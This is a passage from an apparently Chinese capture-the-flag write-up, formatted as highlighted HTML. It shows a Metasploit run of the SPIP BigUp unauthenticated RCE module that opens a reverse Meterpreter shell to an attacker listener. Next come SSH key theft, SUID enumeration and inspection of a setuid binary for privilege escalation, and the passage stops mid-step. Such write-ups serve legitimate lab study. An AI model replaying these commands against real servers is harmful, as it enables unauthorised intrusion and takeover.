+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">-</span><span class="p">]</span> <span class="n">No</span> <span class="n">results</span> <span class="n">from</span> <span class="n">search</span>
+</span></span><span class="line"><span class="cl"><span class="n">msf6</span> <span class="o">&gt;</span> <span class="n">search</span> <span class="n">SPIP</span> <span class="mf">4.2</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">Matching</span> <span class="n">Modules</span>
+</span></span><span class="line"><span class="cl"><span class="o">================</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">   <span class="c1">#   Name                                             Disclosure Date  Rank       Check  Description</span>
+</span></span><span class="line"><span class="cl">   <span class="o">-</span>   <span class="o">----</span>                                             <span class="o">---------------</span>  <span class="o">----</span>       <span class="o">-----</span>  <span class="o">-----------</span>
+</span></span><span class="line"><span class="cl">   <span class="mi">0</span>   <span class="n">exploit</span><span class="o">/</span><span class="n">multi</span><span class="o">/</span><span class="n">http</span><span class="o">/</span><span class="n">spip_bigup_unauth_rce</span>         <span class="mi">2024</span><span class="o">-</span><span class="mi">09</span><span class="o">-</span><span class="mi">06</span>       <span class="n">excellent</span>  <span class="n">Yes</span>    <span class="n">SPIP</span> <span class="n">BigUp</span> <span class="n">Plugin</span> <span class="n">Unauthenticated</span> <span class="n">RCE</span>                                
+</span></span><span class="line"><span class="cl">   <span class="mi">1</span>     \<span class="n">_</span> <span class="n">target</span><span class="p">:</span> <span class="n">PHP</span> <span class="n">In</span><span class="o">-</span><span class="n">Memory</span>                       <span class="o">.</span>                <span class="o">.</span>          <span class="o">.</span>      <span class="o">.</span>
+</span></span><span class="line"><span class="cl">   <span class="mi">2</span>     \<span class="n">_</span> <span class="n">target</span><span class="p">:</span> <span class="n">Unix</span><span class="o">/</span><span class="n">Linux</span> <span class="n">Command</span> <span class="n">Shell</span>            <span class="o">.</span>                <span class="o">.</span>          <span class="o">.</span>      <span class="o">.</span>
+</span></span><span class="line"><span class="cl">   <span class="mi">3</span>     \<span class="n">_</span> <span class="n">target</span><span class="p">:</span> <span class="n">Windows</span> <span class="n">Command</span> <span class="n">Shell</span>               <span class="o">.</span>                <span class="o">.</span>          <span class="o">.</span>      <span class="o">.</span>
+</span></span><span class="line"><span class="cl">   <span class="mi">4</span>   <span class="n">exploit</span><span class="o">/</span><span class="n">multi</span><span class="o">/</span><span class="n">http</span><span class="o">/</span><span class="n">spip_porte_plume_previsu_rce</span>  <span class="mi">2024</span><span class="o">-</span><span class="mi">08</span><span class="o">-</span><span class="mi">16</span>       <span class="n">excellent</span>  <span class="n">Yes</span>    <span class="n">SPIP</span> <span class="n">Unauthenticated</span> <span class="n">RCE</span> <span class="n">via</span> <span class="n">porte_plume</span> <span class="n">Plugin</span>                      
+</span></span><span class="line"><span class="cl">   <span class="mi">5</span>     \<span class="n">_</span> <span class="n">target</span><span class="p">:</span> <span class="n">PHP</span> <span class="n">In</span><span class="o">-</span><span class="n">Memory</span>                       <span class="o">.</span>                <span class="o">.</span>          <span class="o">.</span>      <span class="o">.</span>
+</span></span><span class="line"><span class="cl">   <span class="mi">6</span>     \<span class="n">_</span> <span class="n">target</span><span class="p">:</span> <span class="n">Unix</span><span class="o">/</span><span class="n">Linux</span> <span class="n">Command</span> <span class="n">Shell</span>            <span class="o">.</span>                <span class="o">.</span>          <span class="o">.</span>      <span class="o">.</span>
+</span></span><span class="line"><span class="cl">   <span class="mi">7</span>     \<span class="n">_</span> <span class="n">target</span><span class="p">:</span> <span class="n">Windows</span> <span class="n">Command</span> <span class="n">Shell</span>               <span class="o">.</span>                <span class="o">.</span>          <span class="o">.</span>      <span class="o">.</span>
+</span></span><span class="line"><span class="cl">   <span class="mi">8</span>   <span class="n">exploit</span><span class="o">/</span><span class="n">multi</span><span class="o">/</span><span class="n">http</span><span class="o">/</span><span class="n">spip_rce_form</span>                 <span class="mi">2023</span><span class="o">-</span><span class="mi">02</span><span class="o">-</span><span class="mi">27</span>       <span class="n">excellent</span>  <span class="n">Yes</span>    <span class="n">SPIP</span> <span class="n">form</span> <span class="n">PHP</span> <span class="n">Injection</span>                                              
+</span></span><span class="line"><span class="cl">   <span class="mi">9</span>     \<span class="n">_</span> <span class="n">target</span><span class="p">:</span> <span class="n">PHP</span> <span class="n">In</span><span class="o">-</span><span class="n">Memory</span>                       <span class="o">.</span>                <span class="o">.</span>          <span class="o">.</span>      <span class="o">.</span>
+</span></span><span class="line"><span class="cl">   <span class="mi">10</span>    \<span class="n">_</span> <span class="n">target</span><span class="p">:</span> <span class="n">Unix</span><span class="o">/</span><span class="n">Linux</span> <span class="n">Command</span> <span class="n">Shell</span>            <span class="o">.</span>                <span class="o">.</span>          <span class="o">.</span>      <span class="o">.</span>
+</span></span><span class="line"><span class="cl">   <span class="mi">11</span>    \<span class="n">_</span> <span class="n">target</span><span class="p">:</span> <span class="n">Windows</span> <span class="n">Command</span> <span class="n">Shell</span>               <span class="o">.</span>                <span class="o">.</span>          <span class="o">.</span>      <span class="o">.</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">Interact</span> <span class="n">with</span> <span class="n">a</span> <span class="n">module</span> <span class="n">by</span> <span class="n">name</span> <span class="ow">or</span> <span class="n">index</span><span class="o">.</span> <span class="n">For</span> <span class="n">example</span> <span class="n">info</span> <span class="mi">11</span><span class="p">,</span> <span class="n">use</span> <span class="mi">11</span> <span class="ow">or</span> <span class="n">use</span> <span class="n">exploit</span><span class="o">/</span><span class="n">multi</span><span class="o">/</span><span class="n">http</span><span class="o">/</span><span class="n">spip_rce_form</span>                                                    
+</span></span><span class="line"><span class="cl"><span class="n">After</span> <span class="n">interacting</span> <span class="n">with</span> <span class="n">a</span> <span class="n">module</span> <span class="n">you</span> <span class="n">can</span> <span class="n">manually</span> <span class="n">set</span> <span class="n">a</span> <span class="n">TARGET</span> <span class="n">with</span> <span class="n">set</span> <span class="n">TARGET</span> <span class="s1">&#39;Windows Command Shell&#39;</span>                                                           
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">msf6</span> <span class="o">&gt;</span> <span class="n">use</span> <span class="mi">0</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">No</span> <span class="n">payload</span> <span class="n">configured</span><span class="p">,</span> <span class="n">defaulting</span> <span class="n">to</span> <span class="n">php</span><span class="o">/</span><span class="n">meterpreter</span><span class="o">/</span><span class="n">reverse_tcp</span>
+</span></span><span class="line"><span class="cl"><span class="n">msf6</span> <span class="n">exploit</span><span class="p">(</span><span class="n">multi</span><span class="o">/</span><span class="n">http</span><span class="o">/</span><span class="n">spip_bigup_unauth_rce</span><span class="p">)</span> <span class="o">&gt;</span> <span class="n">show</span> <span class="n">options</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">Module</span> <span class="n">options</span> <span class="p">(</span><span class="n">exploit</span><span class="o">/</span><span class="n">multi</span><span class="o">/</span><span class="n">http</span><span class="o">/</span><span class="n">spip_bigup_unauth_rce</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">   <span class="n">Name</span>       <span class="n">Current</span> <span class="n">Setting</span>  <span class="n">Required</span>  <span class="n">Description</span>
+</span></span><span class="line"><span class="cl">   <span class="o">----</span>       <span class="o">---------------</span>  <span class="o">--------</span>  <span class="o">-----------</span>
+</span></span><span class="line"><span class="cl">   <span class="n">FORM_PAGE</span>  <span class="n">Auto</span>             <span class="n">yes</span>       <span class="n">A</span> <span class="n">page</span> <span class="n">with</span> <span class="n">a</span> <span class="n">form</span><span class="o">.</span>
+</span></span><span class="line"><span class="cl">   <span class="n">Proxies</span>                     <span class="n">no</span>        <span class="n">A</span> <span class="n">proxy</span> <span class="n">chain</span> <span class="n">of</span> <span class="n">format</span> <span class="n">type</span><span class="p">:</span><span class="n">host</span><span class="p">:</span><span class="n">por</span>
+</span></span><span class="line"><span class="cl">                                         <span class="n">t</span><span class="p">[,</span><span class="n">type</span><span class="p">:</span><span class="n">host</span><span class="p">:</span><span class="n">port</span><span class="p">][</span><span class="o">...</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">   <span class="n">RHOSTS</span>                      <span class="n">yes</span>       <span class="n">The</span> <span class="n">target</span> <span class="n">host</span><span class="p">(</span><span class="n">s</span><span class="p">),</span> <span class="n">see</span> <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">docs</span><span class="o">.</span>
+</span></span><span class="line"><span class="cl">                                         <span class="n">metasploit</span><span class="o">.</span><span class="n">com</span><span class="o">/</span><span class="n">docs</span><span class="o">/</span><span class="n">using</span><span class="o">-</span><span class="n">metasploit</span><span class="o">/</span>
+</span></span><span class="line"><span class="cl">                                         <span class="n">basics</span><span class="o">/</span><span class="n">using</span><span class="o">-</span><span class="n">metasploit</span><span class="o">.</span><span class="n">html</span>
+</span></span><span class="line"><span class="cl">   <span class="n">RPORT</span>      <span class="mi">80</span>               <span class="n">yes</span>       <span class="n">The</span> <span class="n">target</span> <span class="n">port</span> <span class="p">(</span><span class="n">TCP</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">   <span class="n">SSL</span>        <span class="bp">false</span>            <span class="n">no</span>        <span class="n">Negotiate</span> <span class="n">SSL</span><span class="o">/</span><span class="n">TLS</span> <span class="k">for</span> <span class="n">outgoing</span> <span class="n">connec</span>
+</span></span><span class="line"><span class="cl">                                         <span class="n">tions</span>
+</span></span><span class="line"><span class="cl">   <span class="n">TARGETURI</span>  <span class="o">/</span>                <span class="n">yes</span>       <span class="ne">Path</span> <span class="n">to</span> <span class="n">Spip</span> <span class="n">install</span>
+</span></span><span class="line"><span class="cl">   <span class="n">VHOST</span>                       <span class="n">no</span>        <span class="n">HTTP</span> <span class="n">server</span> <span class="n">virtual</span> <span class="n">host</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">Payload</span> <span class="n">options</span> <span class="p">(</span><span class="n">php</span><span class="o">/</span><span class="n">meterpreter</span><span class="o">/</span><span class="n">reverse_tcp</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">   <span class="n">Name</span>   <span class="n">Current</span> <span class="n">Setting</span>  <span class="n">Required</span>  <span class="n">Description</span>
+</span></span><span class="line"><span class="cl">   <span class="o">----</span>   <span class="o">---------------</span>  <span class="o">--------</span>  <span class="o">-----------</span>
+</span></span><span class="line"><span class="cl">   <span class="n">LHOST</span>  <span class="mf">192.168</span><span class="o">.</span><span class="mf">31.183</span>   <span class="n">yes</span>       <span class="n">The</span> <span class="n">listen</span> <span class="n">address</span> <span class="p">(</span><span class="n">an</span> <span class="n">interface</span> <span class="n">may</span> <span class="n">be</span> <span class="n">s</span>
+</span></span><span class="line"><span class="cl">                                     <span class="n">pecified</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">   <span class="n">LPORT</span>  <span class="mi">4444</span>             <span class="n">yes</span>       <span class="n">The</span> <span class="n">listen</span> <span class="n">port</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">Exploit</span> <span class="n">target</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">   <span class="n">Id</span>  <span class="n">Name</span>
+</span></span><span class="line"><span class="cl">   <span class="o">--</span>  <span class="o">----</span>
+</span></span><span class="line"><span class="cl">   <span class="mi">0</span>   <span class="n">PHP</span> <span class="n">In</span><span class="o">-</span><span class="n">Memory</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">View</span> <span class="n">the</span> <span class="n">full</span> <span class="n">module</span> <span class="n">info</span> <span class="n">with</span> <span class="n">the</span> <span class="n">info</span><span class="p">,</span> <span class="ow">or</span> <span class="n">info</span> <span class="o">-</span><span class="n">d</span> <span class="n">command</span><span class="o">.</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">msf6</span> <span class="n">exploit</span><span class="p">(</span><span class="n">multi</span><span class="o">/</span><span class="n">http</span><span class="o">/</span><span class="n">spip_bigup_unauth_rce</span><span class="p">)</span> <span class="o">&gt;</span> <span class="n">set</span> <span class="n">RHOSTS</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">192.168</span><span class="o">.</span><span class="mf">31.8</span><span class="o">/</span><span class="n">spip</span><span class="o">/</span>
+</span></span><span class="line"><span class="cl"><span class="n">RHOSTS</span> <span class="o">=&gt;</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">192.168</span><span class="o">.</span><span class="mf">31.8</span><span class="o">/</span><span class="n">spip</span><span class="o">/</span>
+</span></span><span class="line"><span class="cl"><span class="n">msf6</span> <span class="n">exploit</span><span class="p">(</span><span class="n">multi</span><span class="o">/</span><span class="n">http</span><span class="o">/</span><span class="n">spip_bigup_unauth_rce</span><span class="p">)</span> <span class="o">&gt;</span> <span class="n">run</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Started</span> <span class="n">reverse</span> <span class="n">TCP</span> <span class="n">handler</span> <span class="n">on</span> <span class="mf">192.168</span><span class="o">.</span><span class="mf">31.183</span><span class="p">:</span><span class="mi">4444</span> 
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Running</span> <span class="n">automatic</span> <span class="n">check</span> <span class="p">(</span><span class="s2">&#34;set AutoCheck false&#34;</span> <span class="n">to</span> <span class="n">disable</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">SPIP</span> <span class="n">Version</span> <span class="n">detected</span><span class="p">:</span> <span class="mf">4.2</span><span class="o">.</span><span class="mi">0</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">SPIP</span> <span class="n">version</span> <span class="mf">4.2</span><span class="o">.</span><span class="mi">0</span> <span class="n">is</span> <span class="n">vulnerable</span><span class="o">.</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Bigup</span> <span class="n">plugin</span> <span class="n">version</span> <span class="n">detected</span><span class="p">:</span> <span class="mf">3.2</span><span class="o">.</span><span class="mi">1</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">The</span> <span class="n">target</span> <span class="n">appears</span> <span class="n">to</span> <span class="n">be</span> <span class="n">vulnerable</span><span class="o">.</span> <span class="n">Both</span> <span class="n">the</span> <span class="n">detected</span> <span class="n">SPIP</span> <span class="n">version</span> <span class="p">(</span><span class="mf">4.2</span><span class="o">.</span><span class="mi">0</span><span class="p">)</span> <span class="ow">and</span> <span class="n">bigup</span> <span class="n">version</span> <span class="p">(</span><span class="mf">3.2</span><span class="o">.</span><span class="mi">1</span><span class="p">)</span> <span class="n">are</span> <span class="n">vulnerable</span><span class="o">.</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Found</span> <span class="n">formulaire_action</span><span class="p">:</span> <span class="n">login</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Found</span> <span class="n">formulaire_action_args</span><span class="p">:</span> <span class="n">CKNCtMYqq36vgfpnNEIK0</span><span class="o">...</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Preparing</span> <span class="n">to</span> <span class="n">send</span> <span class="n">exploit</span> <span class="n">payload</span> <span class="n">to</span> <span class="n">the</span> <span class="n">target</span><span class="o">...</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Sending</span> <span class="n">stage</span> <span class="p">(</span><span class="mi">40004</span> <span class="n">bytes</span><span class="p">)</span> <span class="n">to</span> <span class="mf">192.168</span><span class="o">.</span><span class="mf">31.8</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Meterpreter</span> <span class="n">session</span> <span class="mi">1</span> <span class="n">opened</span> <span class="p">(</span><span class="mf">192.168</span><span class="o">.</span><span class="mf">31.183</span><span class="p">:</span><span class="mi">4444</span> <span class="o">-&gt;</span> <span class="mf">192.168</span><span class="o">.</span><span class="mf">31.8</span><span class="p">:</span><span class="mi">47312</span><span class="p">)</span> <span class="n">at</span> <span class="mi">2025</span><span class="o">-</span><span class="mi">03</span><span class="o">-</span><span class="mi">04</span> <span class="mi">21</span><span class="p">:</span><span class="mi">11</span><span class="p">:</span><span class="mi">27</span> <span class="o">+</span><span class="mi">0800</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">meterpreter</span> <span class="o">&gt;</span> <span class="n">shell</span>
+</span></span><span class="line"><span class="cl"><span class="n">Process</span> <span class="mi">60</span> <span class="n">created</span><span class="o">.</span>
+</span></span><span class="line"><span class="cl"><span class="n">Channel</span> <span class="mi">0</span> <span class="n">created</span><span class="o">.</span>
+</span></span><span class="line"><span class="cl"><span class="n">id</span>
+</span></span><span class="line"><span class="cl"><span class="n">uid</span><span class="o">=</span><span class="mi">33</span><span class="p">(</span><span class="n">www</span><span class="o">-</span><span class="n">data</span><span class="p">)</span> <span class="n">gid</span><span class="o">=</span><span class="mi">33</span><span class="p">(</span><span class="n">www</span><span class="o">-</span><span class="n">data</span><span class="p">)</span> <span class="n">groups</span><span class="o">=</span><span class="mi">33</span><span class="p">(</span><span class="n">www</span><span class="o">-</span><span class="n">data</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>这玩意真好用啊我靠，第一个flag可以直接拿到的</p>
+<h3 id="提权">提权</h3>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">ls -la
+</span></span><span class="line"><span class="cl">total 48
+</span></span><span class="line"><span class="cl">drwxr-xr-x 8 think    think    4096 Feb 10  2024 .
+</span></span><span class="line"><span class="cl">drwxr-xr-x 1 root     root     4096 Dec  7  2023 ..
+</span></span><span class="line"><span class="cl">lrwxrwxrwx 1 root     root        9 Jun 21  2023 .bash_history -&gt; /dev/null
+</span></span><span class="line"><span class="cl">-rw-r--r-- 1 think    think     220 Nov 14  2023 .bash_logout
+</span></span><span class="line"><span class="cl">-rw-r--r-- 1 think    think    3771 Nov 14  2023 .bashrc
+</span></span><span class="line"><span class="cl">drwx------ 2 think    think    4096 Nov 14  2023 .cache
+</span></span><span class="line"><span class="cl">drwx------ 3 think    think    4096 Dec  8  2023 .config
+</span></span><span class="line"><span class="cl">drwx------ 3 think    think    4096 Feb 10  2024 .gnupg
+</span></span><span class="line"><span class="cl">drwxrwxr-x 3 think    think    4096 Jan 10  2024 .local
+</span></span><span class="line"><span class="cl">-rw-r--r-- 1 think    think     807 Nov 14  2023 .profile
+</span></span><span class="line"><span class="cl">lrwxrwxrwx 1 think    think       9 Feb 10  2024 .python_history -&gt; /dev/null
+</span></span><span class="line"><span class="cl">drwxr-xr-x 2 think    think    4096 Jan 10  2024 .ssh
+</span></span><span class="line"><span class="cl">lrwxrwxrwx 1 think    think       9 Feb 10  2024 .viminfo -&gt; /dev/null
+</span></span><span class="line"><span class="cl">drwxr-x--- 5 www-data www-data 4096 Dec 20  2023 spip
+</span></span><span class="line"><span class="cl">-rw-r--r-- 1 root     root       35 Feb 10  2024 user.txt
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>.ssh可以读，读密钥ssh上去</p>
+<p>信息收集一下</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">think@publisher:~$ find / -perm -u=s -type f 2&gt;/dev/null
+</span></span><span class="line"><span class="cl">/usr/lib/policykit-1/polkit-agent-helper-1
+</span></span><span class="line"><span class="cl">/usr/lib/openssh/ssh-keysign
+</span></span><span class="line"><span class="cl">/usr/lib/eject/dmcrypt-get-device
+</span></span><span class="line"><span class="cl">/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+</span></span><span class="line"><span class="cl">/usr/lib/xorg/Xorg.wrap
+</span></span><span class="line"><span class="cl">/usr/sbin/pppd
+</span></span><span class="line"><span class="cl">/usr/sbin/run_container
+</span></span><span class="line"><span class="cl">/usr/bin/at
+</span></span><span class="line"><span class="cl">/usr/bin/fusermount
+</span></span><span class="line"><span class="cl">/usr/bin/gpasswd
+</span></span><span class="line"><span class="cl">/usr/bin/chfn
+</span></span><span class="line"><span class="cl">/usr/bin/sudo
+</span></span><span class="line"><span class="cl">/usr/bin/chsh
+</span></span><span class="line"><span class="cl">/usr/bin/passwd
+</span></span><span class="line"><span class="cl">/usr/bin/mount
+</span></span><span class="line"><span class="cl">/usr/bin/su
+</span></span><span class="line"><span class="cl">/usr/bin/newgrp
+</span></span><span class="line"><span class="cl">/usr/bin/pkexec
+</span></span><span class="line"><span class="cl">/usr/bin/umount
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><code>/usr/sbin/run_container</code>这玩意有权限的，看看是什么，<code>cat</code>有乱码，<code>strings</code>看看</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span><span class="lnt">57
+</span><span class="lnt">58
+</span><span class="lnt">59
+</span><span class="lnt">60
+</span><span class="lnt">61
+</span><span class="lnt">62
+</span><span class="lnt">63
+</span><span class="lnt">64
+</span><span class="lnt">65
+</span><span class="lnt">66
+</span><span class="lnt">67
+</span><span class="lnt">68
+</span><span class="lnt">69
+</span><span class="lnt">70
+</span><span class="lnt">71
+</span><span class="lnt">72
+</span><span class="lnt">73
+</span><span class="lnt">74
+</span><span class="lnt">75
+</span><span class="lnt">76
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">think@publisher:~$ strings /usr/sbin/run_container
+</span></span><span class="line"><span class="cl">/lib64/ld-linux-x86-64.so.2
+</span></span><span class="line"><span class="cl">libc.so.6
+</span></span><span class="line"><span class="cl">__stack_chk_fail
+</span></span><span class="line"><span class="cl">execve
+</span></span><span class="line"><span class="cl">__cxa_finalize
+</span></span><span class="line"><span class="cl">__libc_start_main
+</span></span><span class="line"><span class="cl">GLIBC_2.2.5
+</span></span><span class="line"><span class="cl">GLIBC_2.4
+</span></span><span class="line"><span class="cl">_ITM_deregisterTMCloneTable
+</span></span><span class="line"><span class="cl">__gmon_start__
+</span></span><span class="line"><span class="cl">_ITM_registerTMCloneTable
+</span></span><span class="line"><span class="cl">u+UH
+</span></span><span class="line"><span class="cl">[]A\A]A^A_
+</span></span><span class="line"><span class="cl">/bin/bash
+</span></span><span class="line"><span class="cl">/opt/run_container.sh
+</span></span><span class="line"><span class="cl">:*3$&#34;
+</span></span><span class="line"><span class="cl">GCC: (Ubuntu 9.4.0-1ubuntu1~20.04.2) 9.4.0
+</span></span><span class="line"><span class="cl">crtstuff.c
+</span></span><span class="line"><span class="cl">deregister_tm_clones
+</span></span><span class="line"><span class="cl">__do_global_dtors_aux
+</span></span><span class="line"><span class="cl">completed.8061
+</span></span><span class="line"><span class="cl">__do_global_dtors_aux_fini_array_entry
+</span></span><span class="line"><span class="cl">frame_dummy
+</span></span><span class="line"><span class="cl">__frame_dummy_init_array_entry
+</span></span><span class="line"><span class="cl">run_container.c
+</span></span><span class="line"><span class="cl">__FRAME_END__
+</span></span><span class="line"><span class="cl">__init_array_end
+</span></span><span class="line"><span class="cl">_DYNAMIC
+</span></span><span class="line"><span class="cl">__init_array_start
+</span></span><span class="line"><span class="cl">__GNU_EH_FRAME_HDR
+</span></span><span class="line"><span class="cl">_GLOBAL_OFFSET_TABLE_
+</span></span><span class="line"><span class="cl">__libc_csu_fini
+</span></span><span class="line"><span class="cl">_ITM_deregisterTMCloneTable
+</span></span><span class="line"><span class="cl">_edata
+</span></span><span class="line"><span class="cl">__stack_chk_fail@@GLIBC_2.4
+</span></span><span class="line"><span class="cl">__libc_start_main@@GLIBC_2.2.5
+</span></span><span class="line"><span class="cl">execve@@GLIBC_2.2.5
+</span></span><span class="line"><span class="cl">__data_start
+</span></span><span class="line"><span class="cl">__gmon_start__
+</span></span><span class="line"><span class="cl">__dso_handle
+</span></span><span class="line"><span class="cl">_IO_stdin_used
+</span></span><span class="line"><span class="cl">__libc_csu_init
+</span></span><span class="line"><span class="cl">__bss_start
+</span></span><span class="line"><span class="cl">main
+</span></span><span class="line"><span class="cl">__TMC_END__
+</span></span><span class="line"><span class="cl">_ITM_registerTMCloneTable
+</span></span><span class="line"><span class="cl">__cxa_finalize@@GLIBC_2.2.5
+</span></span><span class="line"><span class="cl">.symtab
+</span></span><span class="line"><span class="cl">.strtab
+</span></span><span class="line"><span class="cl">.shstrtab
+</span></span><span class="line"><span class="cl">.interp
+</span></span><span class="line"><span class="cl">.note.gnu.property
+</span></span><span class="line"><span class="cl">.note.gnu.build-id
+</span></span><span class="line"><span class="cl">.note.ABI-tag
+</span></span><span class="line"><span class="cl">.gnu.hash
+</span></span><span class="line"><span class="cl">.dynsym
+</span></span><span class="line"><span class="cl">.dynstr
+</span></span><span class="line"><span class="cl">.gnu.version
+</span></span><span class="line"><span class="cl">.gnu.version_r
+</span></span><span class="line"><span class="cl">.rela.dyn
+</span></span><span class="line"><span class="cl">.rela.plt
+</span></span><span class="line"><span class="cl">.init
+</span></span><span class="line"><span class="cl">.plt.got
+</span></span><span class="line"><span class="cl">.plt.sec
+</span></span><span class="line"><span class="cl">.text
+</span></span><span class="line"><span class="cl">.fini
+</span></span><span class="line"><span class="cl">.rodata
+</span></span><span class="line"><span class="cl">.eh_frame_hdr
+</span></span><span class="line"><span class="cl">.eh_frame
+</span></span><span class="line"><span class="cl">.init_array
+</span></span><span class="line"><span class="cl">.fini_array
+</span></span><span class="line"><span class="cl">.dynamic
+</span></span><span class="line"><span class="cl">.data
+</span></span><span class="line"><span class="cl">.bss
+</span></span><span class="line"><span class="cl">.comment
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>看看<code>.sh</code></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
